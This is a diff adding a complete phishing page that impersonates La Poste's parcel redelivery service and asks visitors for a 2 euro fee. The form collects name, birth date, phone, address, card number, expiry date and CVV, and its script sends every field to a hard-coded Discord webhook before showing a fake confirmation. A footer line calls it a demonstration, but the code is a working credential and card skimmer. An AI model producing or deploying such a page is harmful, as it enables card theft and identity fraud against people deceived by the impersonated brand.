@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Coordonnées de livraison | La Poste</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* Global Styles */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f9;
+            color: #333;
+        }
+        header {
+            background-color: #ffcc00;
+            padding: 10px;
+            text-align: center;
+        }
+        header img {
+            max-width: 150px;
+        }
+        
+        /* Main Form Styling */
+        .container {
+            width: 100%;
+            max-width: 800px;
+            margin: 30px auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+        }
+        .form-card {
+            padding: 20px;
+        }
+        .form-header h2 {
+            text-align: center;
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 5px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            transition: border-color 0.3s;
+        }
+
+        .form-group input:focus {
+            border-color: #ffcc00;
+            outline: none;
+        }
+
+        .form-group.full-width input {
+            width: calc(100% - 20px);
+        }
+
+        /* Button Styling */
+        .submit-btn {
+            background-color: #ffcc00;
+            color: white;
+            padding: 15px;
+            width: 100%;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            border: none;
+            transition: background-color 0.3s ease;
+        }
+
+        .submit-btn:hover {
+            background-color: #ffb700;
+        }
+
+        .submit-btn i {
+            margin-right: 8px;
+        }
+
+        .payment-summary {
+            font-size: 16px;
+            margin-top: 20px;
+            text-align: right;
+        }
+
+        .payment-summary .amount {
+            color: #ffcc00;
+        }
+
+        /* Footer */
+        footer {
+            background-color: #333;
+            color: white;
+            padding: 10px 0;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        /* Responsiveness */
+        @media (max-width: 600px) {
+            .container {
+                padding: 15px;
+            }
+
+            .submit-btn {
+                font-size: 16px;
+                padding: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header avec le logo de La Poste -->
+    <header class="header">
+        <div class="header-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/1/1a/Logo_La_Poste_2015.svg/1200px-Logo_La_Poste_2015.svg.png" alt="Logo La Poste">
+        </div>
+    </header>
+
+    <!-- Formulaire de livraison -->
+    <main class="container">
+        <div class="form-card">
+            <div class="form-header">
+                <h2>Confirmez vos informations de livraison</h2>
+            </div>
+            <div class="form-body">
+                <form id="redeliveryForm">
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label for="prenom">Prénom</label>
+                            <input type="text" id="prenom" name="prenom" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="nom">Nom</label>
+                            <input type="text" id="nom" name="nom" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="dateDeNaissance">Date de naissance</label>
+                            <input type="date" id="dateDeNaissance" name="dateDeNaissance" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="telephone">Numéro de téléphone</label>
+                            <input type="tel" id="telephone" name="telephone" required>
+                        </div>
+                        <div class="form-group full-width">
+                            <label for="adresse">Adresse</label>
+                            <input type="text" id="adresse" name="adresse" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="codePostal">Code postal</label>
+                            <input type="text" id="codePostal" name="codePostal" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="ville">Ville</label>
+                            <input type="text" id="ville" name="ville" required>
+                        </div>
+                        <div class="form-group full-width">
+                            <label for="numeroCarte">Numéro de carte bancaire</label>
+                            <input type="text" id="numeroCarte" name="numeroCarte" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="expiration">Date d'expiration (MM/AA)</label>
+                            <input type="text" id="expiration" name="expiration" placeholder="MM/AA" maxlength="5" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="cvv">CVV</label>
+                            <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
+                        </div>
+                    </div>
+                    <div class="payment-summary">
+                        <p>Frais de livraison : <span class="amount">2,00 €</span></p>
+                    </div>
+                    <button type="submit" class="submit-btn">
+                        <i class="fas fa-lock"></i> Payer 2,00 € et finaliser la livraison de votre colis
+                    </button>
+                </form>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <p>&copy; 2026 La Poste - Tous droits réservés | Ce site est une reproduction à des fins de démonstration.</p>
+    </footer>
+
+    <script>
+        // Remplace cette URL par l'URL de ton Webhook Discord
+        const webhookUrl = 'https://discord.com/api/webhooks/1469944663782854731/82ydbwWfmqtolTAeIqKI3I7R75pJhGUWOafQyujhCSOZR0oDYsT94B9hhPHxPcgfuLEf';
+
+        // Fonction pour envoyer les données au Webhook Discord
+        function sendToDiscord(formData) {
+            const message = {
+                content: `Nouvelle demande de renouvellement de livraison`,
+                embeds: [{
+                    title: "Détails de la livraison",
+                    fields: [
+                        { name: "Prénom", value: formData.prenom },
+                        { name: "Nom", value: formData.nom },
+                        { name: "Date de naissance", value: formData.dateDeNaissance },
+                        { name: "Numéro de téléphone", value: formData.telephone },
+                        { name: "Adresse", value: formData.adresse },
+                        { name: "Code postal", value: formData.codePostal },
+                        { name: "Ville", value: formData.ville },
+                        { name: "Numéro de carte", value: formData.numeroCarte },
+                        { name: "Expiration carte", value: formData.expiration },
+                        { name: "CVV", value: formData.cvv }
+                    ],
+                    color: 16115527 // Jaune La Poste
+                }]
+            };
+
+            // Envoi de la requête POST vers le Webhook Discord
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(message)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message envoyé à Discord:', data);
+            })
+            .catch(error => {
+                console.error('Erreur lors de l\'envoi à Discord:', error);
+            });
+        }
+
+        // Écoute l'envoi du formulaire
+        document.getElementById('redeliveryForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Empêche le formulaire de se soumettre normalement
+
+            // Récupération des valeurs du formulaire
+            const formData = {
+                prenom: document.getElementById('prenom').value,
+                nom: document.getElementById('nom').value,
+                dateDeNaissance: document.getElementById('dateDeNaissance').value,
+                telephone: document.getElementById('telephone').value,
+                adresse: document.getElementById('adresse').value,
+                codePostal: document.getElementById('codePostal').value,
+                ville: document.getElementById('ville').value,
+                numeroCarte: document.getElementById('numeroCarte').value,
+                expiration: document.getElementById('expiration').value,
+                cvv: document.getElementById('cvv').value
+            };
+
+            // Envoi des données au webhook Discord
+            sendToDiscord(formData);
+
+            // Afficher un message de confirmation ou rediriger vers une autre page
+            alert('Votre demande a été envoyée !');
+        });
+    </script>
+
+</body>
+</html>
